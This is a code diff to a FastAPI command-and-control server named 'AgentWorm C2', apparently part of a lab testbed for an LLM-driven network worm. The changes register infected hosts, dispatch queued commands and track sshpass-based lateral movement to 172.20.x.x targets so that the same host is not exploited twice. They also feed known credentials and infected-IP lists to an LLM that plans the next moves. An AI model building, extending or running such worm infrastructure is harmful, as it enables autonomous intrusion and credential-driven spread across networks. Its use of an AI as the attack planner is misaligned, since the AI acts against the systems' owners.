@@ -2,6 +2,7 @@ import json
 import logging
 import os
 import statistics
+import time
 import uuid
 from datetime import datetime, timezone
 from pathlib import Path
@@ -18,8 +19,25 @@ log = logging.getLogger("c2")
 
 app = FastAPI(title="AgentWorm C2")
 
+import re as _re
+
 hosts: dict[str, HostMemory] = {}
 killed = False
+
+# IPs where a lateral move command has been dispatched: {ip: dispatch_timestamp}.
+# Treated as "already targeted" to prevent cross-host duplicate exploits.
+# Entries expire after PROPAGATING_TTL seconds so failed attempts don't lock a host forever.
+PROPAGATING_TTL = 60
+_propagating_ips: dict[str, float] = {}
+# Only match SSH lateral moves (sshpass + user@IP).
+# Web exploit probes/deliveries are NOT matched here — idempotent registration
+# is the backstop for web-delivered duplicate DBAs (probes must not be suppressed).
+_LATERAL_RE = _re.compile(r'sshpass.+?@(172\.20\.\d+\.\d+)')
+
+
+def _extract_target_ip(cmd: str) -> str | None:
+    m = _LATERAL_RE.search(cmd)
+    return m.group(1) if m else None
 
 # Unique ID for this C2 session — every LLM call and event is tagged with it (NFR-REP-01)
 run_id = str(uuid.uuid4())
@@ -72,6 +90,14 @@ def _relay_map() -> dict:
 
 @app.post("/register")
 def register(payload: RegisterPayload, background_tasks: BackgroundTasks):
+    # Idempotent on local_ip: if this IP already registered, return existing host_id.
+    # Prevents duplicate HostMemory entries when multiple exploits land on the same target.
+    existing = next((h for h in hosts.values() if h.local_ip == payload.local_ip), None)
+    if existing:
+        log.info("DUPLICATE_REGISTER ip=%s returning existing host_id=%s",
+                 payload.local_ip, existing.host_id)
+        return {"host_id": existing.host_id}
+
     host_id = str(uuid.uuid4())[:8]
     host = HostMemory(
         host_id=host_id,
@@ -83,6 +109,7 @@ def register(payload: RegisterPayload, background_tasks: BackgroundTasks):
         tools=payload.tools,
     )
     hosts[host_id] = host
+    _propagating_ips.pop(payload.local_ip, None)
     log.info(
         "REGISTERED host_id=%s hostname=%s ip=%s user=%s os=%s tools=%s",
         host_id,
@@ -104,12 +131,30 @@ def get_commands(host_id: str):
     host = hosts.get(host_id)
     if host is None:
         raise HTTPException(status_code=404, detail="unknown host")
+    # Expire stale propagating entries so failed lateral moves don't lock a host forever.
+    now = time.time()
+    expired = [ip for ip, t in _propagating_ips.items() if now - t > PROPAGATING_TTL]
+    for ip in expired:
+        del _propagating_ips[ip]
+        log.info("PROPAGATING_EXPIRE ip=%s (no registration after %ds)", ip, PROPAGATING_TTL)
+
     cmds = list(host.command_queue)
     host.command_queue.clear()
+    kept_cmds = []
+    already_targeted = _infected_ips() | _propagating_ips.keys()
     for cmd in cmds:
+        target = _extract_target_ip(cmd)
+        if target and target in already_targeted:
+            log.info("SKIP already-propagating host_id=%s target=%s", host_id, target)
+            continue
+        if target:
+            _propagating_ips[target] = time.time()
+            already_targeted.add(target)
+            log.info("PROPAGATING_TARGET host_id=%s target=%s", host_id, target)
         host.history.append(CommandRecord(cmd=cmd, issued_at=_now()))
         log.info("DISPATCHED host_id=%s cmd=%r", host_id, cmd)
-    return {"commands": cmds}
+        kept_cmds.append(cmd)
+    return {"commands": kept_cmds}
 
 
 @app.post("/results/{host_id}")
@@ -123,10 +168,16 @@ def post_result(host_id: str, payload: ResultPayload, background_tasks: Backgrou
             record.returned_at = _now()
             break
     log.info("RESULT host_id=%s cmd=%r output=%r", host_id, payload.cmd, payload.output[:200])
-    # LLM reasoning runs in the background — DBA HTTP call returns immediately
+    # LLM reasoning runs in the background — DBA HTTP call returns immediately.
+    # Pass callables so on_result evaluates a fresh snapshot at reasoning time.
+    # Two separate infected-IP callables: one for M-09 (actual registrations only),
+    # one for the LLM prompt (registrations + propagating, to prevent re-targeting).
     background_tasks.add_task(
         brain.on_result, host, payload.cmd, payload.output,
-        _infected_ips(), _known_creds_by_ip(), _relay_map(),
+        _infected_ips,                              # M-09 count: actual registrations only
+        lambda: _infected_ips() | _propagating_ips.keys(), # LLM prompt: also suppress propagating targets
+        _known_creds_by_ip,
+        _relay_map,
     )
     return {"status": "ok"}
 
